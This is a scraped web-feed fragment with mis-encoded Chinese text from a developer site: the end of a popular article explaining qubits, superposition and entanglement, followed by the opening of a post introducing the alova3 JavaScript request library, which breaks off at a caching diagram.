p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ad6e1fa63244f77a5190386cb10fcad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSp6KGM5peg5b-M:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765931405&amp;x-signature=Oe144rZShdTHHYtVXo31q%2BSym0E%3D" alt="æœªæ ‡é¢˜-1.jpg" loading="lazy"/></p>
<p>é‡å­ä½æ˜¯é‡å­ä¿¡æ¯çš„åŸºæœ¬å•ä½ï¼Œè¿™æ˜¯ä¸€ä¸ªæ—¢æœ‰è¶£åˆå¤æ‚çš„æ¦‚å¿µã€‚è¿™ä¸ä»…ä»…æ˜¯ç§‘æŠ€é¢†åŸŸçš„å¦ä¸€ç§è¶‹åŠ¿ï¼›å®ƒä¹Ÿæ˜¯ä¸€ç§è¶‹åŠ¿ã€‚å®ƒæ˜¯å³å°†åˆ°æ¥çš„é‡å­è®¡ç®—æ—¶ä»£çš„é©å‘½æ€§åŸºçŸ³ã€‚</p>
<blockquote>
<p>â€œé‡å­ä½ä»£è¡¨åŸå­ã€ç¦»å­ã€å…‰å­æˆ–ç”µå­ä»¥åŠå®ƒä»¬å„è‡ªçš„æ§åˆ¶è®¾å¤‡ï¼Œå®ƒä»¬ä¸€èµ·å·¥ä½œï¼Œå……å½“è®¡ç®—æœºå­˜å‚¨å™¨å’Œå¤„ç†å™¨ã€‚â€ â€” IBM é‡å­ç ”ç©¶å‘˜</p>
</blockquote>
<p>åœ¨æ¥ä¸‹æ¥çš„å‡ èŠ‚ä¸­ï¼Œå°†æ·±å…¥æ¢è®¨é‡å­ä½å¯¹é‡å­è®¡ç®—é¢†åŸŸå¦‚æ­¤é‡è¦çš„åŸå› ã€‚ä½†é¦–å…ˆï¼Œéœ€è¦ä¸€ä¸ªåŸºç¡€ï¼Œé¦–å…ˆè¦äº†è§£é‡å­ä½åˆ°åº•æ˜¯ä»€ä¹ˆä»¥åŠä¸ºä»€ä¹ˆå®ƒå¯¹é‡å­è®¡ç®—çš„æœªæ¥è‡³å…³é‡è¦ã€‚</p>
<ul>
<li>ä»€ä¹ˆæ˜¯é‡å­æ¯”ç‰¹ï¼Ÿ</li>
<li>é‡å­æ¯”ç‰¹å¦‚ä½•å·¥ä½œï¼Ÿ</li>
<li>ä¸ºä»€ä¹ˆé‡å­æ¯”ç‰¹åœ¨é‡å­è®¡ç®—ä¸­å¾ˆé‡è¦ï¼Ÿ</li>
</ul>
<p>æ— è®ºæ˜¯å¯¹è¿™ä¸ªæ¦‚å¿µå®Œå…¨é™Œç”Ÿè¿˜æ˜¯åªæ˜¯å¯»æ±‚æ·±å…¥çš„è§£é‡Šï¼Œæœ¬æ–‡éƒ½å°†å¼•å¯¼äº†è§£é‡å­ä½çš„ä¸–ç•Œå¹¶å®šä¹‰å…¶åœ¨æœªæ¥è®¡ç®—ä¸­çš„ä½œç”¨ã€‚</p>
<p>é¦–å…ˆè§£é‡Šä»€ä¹ˆæ˜¯é‡å­ä½ã€‚é€šä¿—åœ°è¯´ï¼Œé‡å­æ¯”ç‰¹ï¼Œå³â€œé‡å­ä½â€ï¼Œæ˜¯é‡å­ä¿¡æ¯çš„åŸºæœ¬å•ä½ã€‚è¿™ä¸ç»å…¸è®¡ç®—ä¸­â€œä½â€çš„æ¦‚å¿µç›¸ä¼¼ï¼Œä½†æœ‰ä¸€äº›é‡è¦çš„å·®å¼‚ã€‚</p>
<p>å¦‚æœç†Ÿæ‚‰ä¼ ç»Ÿè®¡ç®—ï¼Œå°±ä¼šçŸ¥é“ä½æä¾›ä¸¤ç§å¯èƒ½çš„çŠ¶æ€ï¼š<code>0</code> å’Œ <code>1</code>ã€‚è¿™æ˜¯ç»å…¸è®¡ç®—æœºçš„äºŒè¿›åˆ¶åŸºç¡€ã€‚ç„¶è€Œï¼Œé‡å­ä½è¶…è¶Šäº†è¿™ç§äºŒå…ƒæ€§ã€‚ç”±äºé‡å­ç‰©ç†å­¦çš„ç‹¬ç‰¹æ€§è´¨ï¼Œé‡å­ä½ä¸ä»…å¯ä»¥å­˜åœ¨äºçŠ¶æ€ <code>0</code> æˆ– <code>1</code>ï¼Œè¿˜å¯ä»¥å­˜åœ¨äºè¿™äº›çŠ¶æ€çš„å åŠ ä¸­ã€‚è¿™æ„å‘³ç€ä¸€ä¸ªé‡å­ä½å¯ä»¥åŒæ—¶å¤„äº <code>0</code> å’Œ <code>1</code> çŠ¶æ€ï¼Œè¿™ä¸ªæ¦‚å¿µä¹ä¸€çœ‹ä¼¼ä¹å¾ˆé™Œç”Ÿã€‚</p>
<p>å½“å¼€å§‹å°†å‡ ä¸ªé‡å­ä½ä»¥ä¸€ç§ç§°ä¸ºé‡å­çº ç¼ çš„æ–¹å¼ç»„åˆåœ¨ä¸€èµ·æ—¶ï¼ŒçœŸæ­£çš„é­”æ³•å°±ä¼šå‘ç”Ÿã€‚åœ¨è¿™æ ·ä¸€ä¸ªçº ç¼ ç³»ç»Ÿä¸­ï¼Œé‡å­ä½å¯ä»¥ä»¥ç»å…¸è®¡ç®—ä¸­æ— æ³•åšåˆ°çš„æ–¹å¼ç›¸äº’å…³è”ã€‚è¿™äº›å åŠ å’Œçº ç¼ é‡Šæ”¾äº†å·¨å¤§çš„è®¡ç®—èƒ½åŠ›ï¼Œè¿™å°±æ˜¯é‡å­è®¡ç®—çœŸæ­£å‘æŒ¥ä½œç”¨çš„æ—¶å€™ã€‚</p>
<p>é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆè¦å…³å¿ƒé‡å­ä½å‘¢ï¼Ÿè®¡ç®—çš„æœªæ¥åœ¨äºé‡å­è®¡ç®—åŠå…¶é‡å­æ¯”ç‰¹çš„æ ¸å¿ƒã€‚é‡å­è®¡ç®—çš„æ½œåœ¨åº”ç”¨æ˜¯å·¨å¤§çš„ï¼šä»ä»¥æä½çš„æˆæœ¬å’Œæ—¶é—´åˆ›é€ æ–°è¯ï¼Œåˆ°ç ´è§£ä»¥å‰æ— æ³•ç ´è§£çš„ä»£ç ï¼Œåˆ°å‡†ç¡®é¢„æµ‹æ°”å€™å˜åŒ–ç­‰ç­‰ã€‚äº†è§£é‡å­æ¯”ç‰¹æ˜¯äººç±»å®ç°è¿™ä¸€å·¨å¤§é£è·ƒçš„ä¸€å°æ­¥ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d260ffac2fc4bccb3fba95d10338686~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSp6KGM5peg5b-M:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765931405&amp;x-signature=3kU%2FmDV1xTR%2BRMcVynBNO%2FCIuTc%3D" alt="image.png" loading="lazy"/></p>
<p>è™½ç„¶ä»å¤„äºé‡å­è®¡ç®—æŠ€æœ¯çš„æ—©æœŸé˜¶æ®µï¼Œä½†å¯¹é‡å­ä½çš„ç†è§£å’Œæ“çºµæ­£åœ¨å–å¾—é‡å¤§è¿›å±•ã€‚é€šè¿‡æ·±å…¥ç ”ç©¶é‡å­ä½çš„ä¸–ç•Œï¼Œæ­£åœ¨ä¸ºæœªæ¥é“ºå¹³é“è·¯ï¼Œåœ¨æœªæ¥ï¼Œæ›¾ç»å› è®¡ç®—é™åˆ¶è€Œè¢«è®¤ä¸ºæ— æ³•è§£å†³çš„é—®é¢˜å¯ä»¥å¾—åˆ°æ­£é¢è§£å†³ã€‚</p>
<p>å½“æ›´åŠ æ·±å…¥åœ°æ¢ç©¶é‡å­è®¡ç®—çš„å¥¥ç§˜æ—¶ï¼Œå¯èƒ½ä¼šå–å¾—çš„æˆå°±ä»¤äººæƒŠè®¶ã€‚è¿™ä¸€åˆ‡éƒ½å§‹äºç†è§£ä¸èµ·çœ¼ä½†åŠŸèƒ½å¼ºå¤§çš„é‡å­ä½ã€‚</p>
<p>é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥ä»”ç»†ç ”ç©¶ä¸€ä¸‹é‡å­ä½ã€‚æƒ³è±¡ä¸€ä¸‹æœ‰ä¸€ä¸ªå¤„äº <code>|ÏˆâŸ©</code> çŠ¶æ€çš„é‡å­ä½ã€‚åœ¨é‡å­åŠ›å­¦ä¸­ï¼Œè¿™ç§çŠ¶æ€å¯ä»¥ä½¿ç”¨çº¿æ€§ä»£æ•°ä½œä¸ºåˆ—å‘é‡æ¥è¡¨ç¤ºï¼š</p>
<pre><code class="hljs">|ÏˆâŸ© = Î± | 0 âŸ© + Î² | 1 âŸ©
</code></pre>
<p>åœ¨ä¸Šé¢çš„ç­‰å¼ä¸­ï¼Œ<code>Î±</code> å’Œ <code>Î²</code> æ˜¯å¤æ¦‚ç‡å¹…ï¼Œå…¶å¹³æ–¹åç»™å‡ºé‡å­ä½å¤„äºçŠ¶æ€ <code>|0âŸ©</code> æˆ–çŠ¶æ€ <code>|1âŸ©</code> çš„å¯èƒ½æ€§ã€‚å¯¹äºæœ‰æ•ˆçš„é‡å­æ€ï¼Œè¿™äº›æ¦‚ç‡çš„æ€»å’Œå¿…é¡»ç­‰äº <code>1</code>ã€‚å› æ­¤ï¼Œå¯ä»¥å†™ï¼š</p>
<pre><code class="hljs language-css" lang="css">|<span class="hljs-selector-tag">a</span>|^ <span class="hljs-number">2</span> + |<span class="hljs-selector-tag">b</span>|^ <span class="hljs-number">2</span> = <span class="hljs-number">1</span>
</code></pre>
<p>å› æ­¤ï¼Œé€šè¿‡è¿™ä¸ªæ•°å­¦æ–¹ç¨‹ï¼Œå¯ä»¥è®¡ç®—é‡å­è®¡ç®—ä¸­ä»»ä½•ç»™å®šçŠ¶æ€çš„æ¦‚ç‡ï¼è¿™ä¸æ˜¯å¾ˆè¿·äººå—ï¼Ÿ</p>
<ul>
<li>ä¸ç»å…¸è®¡ç®—ä¸­çš„ä¼ ç»Ÿä½ä¸åŒï¼Œé‡å­ä½ç”±äºå åŠ çš„ç‰¹æ€§å¯ä»¥åŒæ—¶å¤„äºä¸¤ç§çŠ¶æ€ï¼Œä½¿å…¶æ›´èƒ½å¤Ÿè¿›è¡Œå¤æ‚çš„è®¡ç®—ã€‚</li>
<li>æ¯å¢åŠ ä¸€ä¸ªé‡å­ä½ï¼Œé‡å­è®¡ç®—æœºçš„è®¡ç®—èƒ½åŠ›å°±ä¼šå‘ˆæŒ‡æ•°çº§å¢é•¿ï¼Œå±•ç°å‡ºè®¡ç®—èƒ½åŠ›çš„å·¨å¤§é£è·ƒã€‚</li>
<li>çº ç¼ æ˜¯å¦ä¸€ç§å…³é”®çš„é‡å­ç°è±¡ï¼Œå®ƒä½¿çº ç¼ çš„é‡å­ä½æ— è®ºè·ç¦»å¦‚ä½•éƒ½èƒ½ç«‹å³ç›¸äº’å½±å“ï¼Œä¸ºè¶…é«˜é€Ÿã€ä¸‹ä¸€ä»£æ•°æ®ä¼ è¾“å¥ å®šäº†åŸºç¡€ã€‚</li>
<li>é‡å­çº é”™æ˜¯é‡å­è®¡ç®—çš„å¦ä¸€ä¸ªå…³é”®æ–¹é¢ï¼Œç”±äºé‡å­ä½çš„è„†å¼±æ€§ï¼Œå› æ­¤éœ€è¦å®ƒã€‚ç§‘å­¦å®¶ä»¬å…¨ç¥è´¯æ³¨äºå¼€å‘ç®¡ç†å’Œçº æ­£é‡å­é”™è¯¯çš„æŠ€æœ¯ã€‚</li>
<li>é‡å­éœ¸æƒæ—¶ä»£æ˜¯å¯ä»¥â€‹â€‹é¢„è§çš„ï¼Œå³é‡å­è®¡ç®—æœºåœ¨è§£å†³å¤æ‚é—®é¢˜æ–¹é¢è¶…è¶Šç»å…¸è®¡ç®—æœºï¼Œä½†å°šæœªå®Œå…¨åˆ°æ¥ã€‚æˆ‘ä»¬æ˜¯é‡å­è®¡ç®—å‘å±•çš„ä¸€éƒ¨åˆ†ã€‚</li>
<li>æœ€åï¼Œè™½ç„¶é‡å­è®¡ç®—æ‹¥æœ‰å·¨å¤§çš„æ½œåŠ›ï¼Œä½†ç”±äºå…¶ç›®å‰å¤„äºèµ·æ­¥é˜¶æ®µä»¥åŠä¸æ‰©å¤§è§„æ¨¡ç›¸å…³çš„æŠ€æœ¯æŒ‘æˆ˜ï¼Œå®ƒä»ç„¶ä¸»è¦å­˜åœ¨äºå®éªŒå®¤ç¯å¢ƒä¸­ã€‚ç„¶è€Œï¼Œè¿‡å»åå¹´æ‰€å–å¾—çš„è¿›æ­¥è¯æ˜äº†è¿™é¡¹æŠ€æœ¯ä¸å¯é˜»æŒ¡çš„å‘å±•ã€‚</li>
</ul>
<p>æ€»ä¹‹ï¼Œåœ¨æ”¹å˜æ¸¸æˆè§„åˆ™çš„é‡å­ä¿¡æ¯å•ä½â€”â€”é‡å­æ¯”ç‰¹çš„å¼•é¢†ä¸‹ï¼Œé‡Šæ”¾é‡å­è®¡ç®—çœŸæ­£æ½œåŠ›çš„å†’é™©ä¹‹æ—…æ­£åœ¨é¡ºåˆ©è¿›è¡Œã€‚å‡­å€Ÿå åŠ å’Œçº ç¼ ç­‰ç‹¬ç‰¹åŠŸèƒ½ï¼Œé‡å­ä½æœ‰æœ›é‡æ–°å®šä¹‰è®¡ç®—èƒ½åŠ›å’Œé€Ÿåº¦çš„ç•Œé™ï¼Œæœ‰æœ›å®ç°é‡å­éœ¸æƒç­‰çªç ´ï¼Œè¿™å¯èƒ½ä¼šå½»åº•æ”¹å˜ä»è§£å¯†åˆ°å¤æ‚é—®é¢˜è§£å†³ç­‰è®¸å¤šé¢†åŸŸã€‚ç„¶è€Œï¼Œå¿…é¡»æ‰¿è®¤æ‰€é¢ä¸´çš„æŒ‘æˆ˜ã€‚å¯¹æœ‰æ•ˆé‡å­çº é”™æ–¹æ³•çš„æ¢ç´¢å’Œæ‰©å¤§é‡å­ç³»ç»Ÿçš„ä»»åŠ¡è¯æ˜äº†è¿™æ¡é“è·¯çš„å¤æ‚æ€§ã€‚ç„¶è€Œï¼Œä¸æ–­çš„è¿›æ­¥æé†’æˆ‘ä»¬ï¼Œè¿™ä¸ªæ–¹å‘çš„æ¯ä¸€æ­¥éƒ½æ˜¯è®¡ç®—è¿›åŒ–çš„ä¸€æ­¥ï¼Œå¼€å¯äº†é‡å­è®¡ç®—ä¸å†å±€é™äºå®éªŒå®¤ï¼Œè€Œæ˜¯æˆä¸ºæˆ‘ä»¬æ—¥å¸¸ç”Ÿæ´»ä¸å¯æˆ–ç¼ºçš„ä¸€éƒ¨åˆ†çš„æœªæ¥ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€ä¸ªè®©ä½ çˆ½æ­ªæ­ªçš„è¯·æ±‚å·¥å…·æ˜¯æ€æ ·çš„]]></title>    <link>https://juejin.cn/post/7581752787563413544</link>    <guid>https://juejin.cn/post/7581752787563413544</guid>    <pubDate>2025-12-10T00:35:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581752787563413544" data-draft-id="7578719771588788234" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€ä¸ªè®©ä½ çˆ½æ­ªæ­ªçš„è¯·æ±‚å·¥å…·æ˜¯æ€æ ·çš„"/> <meta itemprop="keywords" content="Vue.js,React.js,Node.js"/> <meta itemprop="datePublished" content="2025-12-10T00:35:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤éŸµ"/> <meta itemprop="url" content="https://juejin.cn/user/1538972010422872"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€ä¸ªè®©ä½ çˆ½æ­ªæ­ªçš„è¯·æ±‚å·¥å…·æ˜¯æ€æ ·çš„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1538972010422872/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤éŸµ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:35:28.000Z" title="Wed Dec 10 2025 00:35:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å„ä½å¥½ï¼Œå¾ˆä¹…æ²¡å‡ºæ¥å‘ä¸€å‘alovaæ–‡ç« äº†ï¼Œç°åœ¨çš„alovaå·²ç»æ›´æ–°åˆ°ç¬¬3ä¸ªå¤§ç‰ˆæœ¬äº†ï¼Œçœ‹è¿™ç¯‡æ–‡ç« å¯èƒ½ä¼šè®©ä½ å¯¹å®ƒæœ‰ä¸ªå…¨æ–°çš„è®¤è¯†ã€‚</p>
<p>å¦‚æœä½ ä¹‹å‰äº†è§£è¿‡alovaï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡çŸ¥é“alovaæ˜¯ä¸€ä¸ªè½»é‡çº§çš„è¯·æ±‚ç­–ç•¥åº“ï¼Œé€šè¿‡å®ƒçš„å®¢æˆ·ç«¯è¯·æ±‚hookså’Œç¼“å­˜é«˜æ•ˆåœ°å¤„ç†å‰ç«¯æ•°æ®è¯·æ±‚ã€‚</p>
<p>è€Œåˆ°ä»Šå¤©ï¼Œalova3åœ¨æ­¤åŸºç¡€ä¸Šå®ç°äº†æ›´å¤§çš„æå‡ï¼Œå®ƒä¸åªæ˜¯åœ¨å®¢æˆ·ç«¯ä¸­ä½¿ç”¨ï¼Œç°åœ¨è¿˜èƒ½åœ¨æœåŠ¡ç«¯ç¯å¢ƒä¸‹å¤§æ”¾å¼‚å½©ï¼Œæ˜¯ä¸€ä¸ª<strong>å…¨æ ˆå¼çš„æè‡´é«˜æ•ˆçš„è¯·æ±‚å·¥å…·é›†</strong>ï¼Œå…¶æ ¸å¿ƒç›®æ ‡æ˜¯å¸®åŠ©å¼€å‘å›¢é˜Ÿæ›´é«˜æ•ˆåœ°é›†æˆå’Œè°ƒç”¨APIï¼Œå¹¶ä¸”å®Œç¾å…¼å®¹fetchã€axiosç­‰HTTPå®¢æˆ·ç«¯ï¼Œä»¥åŠreactã€vueã€svelteç­‰UIæ¡†æ¶ã€‚</p>
<p>å…·ä½“æ¥è¯´ï¼Œalova3ç›¸æ¯”ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œå®ƒå¸¦æ¥äº†ä»¥ä¸‹çš„å¤§æ›´æ–°ã€‚</p>
<ol>
<li>å¤šçº§ç¼“å­˜ï¼šè¯·æ±‚æ•ˆç‡å’Œå‡å‹åˆ©å™¨ã€‚</li>
<li>å…¨æ ˆçš„è¯·æ±‚ç­–ç•¥ï¼šå¸®ä½ å¤§å¤§å‡å°‘è¯·æ±‚ä»£ç ã€‚</li>
<li>æ›´åŠ ç°ä»£åŒ–çš„OpenAPIå·¥å…·ï¼šä¸ä»…å¯ä»¥è‡ªåŠ¨ç”Ÿæˆè¯·æ±‚ä»£ç ï¼Œè¿˜èƒ½æŠŠapiæ–‡æ¡£æ¬åˆ°ç¼–è¾‘å™¨ä¸­ï¼Œäº¤äº’å¼åœ°è°ƒç”¨apiï¼Œæ‰“ç ´è¿‡å»çš„apié›†æˆæµç¨‹ã€‚</li>
</ol>
<p><strong>è¿™é‡Œæˆ‘æƒ³éƒ‘é‡å£°æ˜ä¸€ä¸‹ï¼Œç”±äºaiå¤§æ¨¡å‹å¯¹alovaçŸ¥è¯†å­¦ä¹ çš„ä¸è¶³ï¼Œç°åœ¨ç½‘ä¸Šå……æ–¥ç€å„ç§aiç¼–å†™çš„alovaçš„é”™è¯¯ä½¿ç”¨çš„æ–‡ç« ï¼Œå»ºè®®å¤§å®¶å‰å¾€<a href="https://link.juejin.cn?target=https%3A%2F%2Falova.js.org" target="_blank" title="https://alova.js.org" ref="nofollow noopener noreferrer">alovaå®˜ç½‘</a>äº†è§£alovaçš„æ­£ç¡®ä½¿ç”¨æ–¹æ³•ã€‚</strong></p>
<h2 data-id="heading-0">ä¸€ã€å¤šçº§ç¼“å­˜</h2>
<p>å¤šçº§ç¼“å­˜æœºåˆ¶å¯ä»¥ä¸ºä½ çš„æœåŠ¡ç«¯åº”ç”¨æä¾›æœ€å¿«çš„è¯·æ±‚ä½“éªŒã€‚ä½ å¯ä»¥è‡ªç”±é€‰æ‹©å•çº§ç¼“å­˜è¿˜æ˜¯å¤šçº§ç¼“å­˜ä½¿ç”¨ï¼Œå®ƒä»¬è¿è¡Œæœºåˆ¶å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[ç”¨æˆ·è¯·æ±‚] --&gt; B{æ£€æŸ¥L1ç¼“å­˜}
    B --&gt;|å‘½ä¸­| C[è¿”å›æ•°æ®]
